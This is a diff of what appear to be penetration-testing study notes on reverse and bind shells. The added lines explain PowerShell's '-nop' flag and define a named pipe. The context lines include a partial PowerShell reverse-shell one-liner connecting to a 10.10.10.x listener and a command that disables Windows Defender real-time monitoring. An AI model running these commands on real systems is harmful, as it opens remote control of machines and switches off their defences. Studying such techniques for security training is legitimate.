@@ -31,6 +31,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 > Sometimes we might be able to disable Windows defender Virus & Threat protection, allowing us to run the above:
 > `Set-MpPreference -DisableRealtimeMonitoring $true`
 
+> 1. `powershell -nop -c` creates a no profile (nop) 
+
 ## Bind Shells
 Unlike a reverse shell, a Bind shell connects us to the *targets'* listening port. This means we are connecting to the target rather than them connecting to us (the opposite direction to a RS).
 
@@ -45,7 +47,7 @@ To setup a bind shell on the server, we need to define:
 - the directory
 - the shell
 - the listener
-- a pipeline (eg. a named pipe)
+- a pipeline (eg. a named pipe) : *a file that can be written and read by multiple processes*
 - input & output redirection
 
 **Bash**
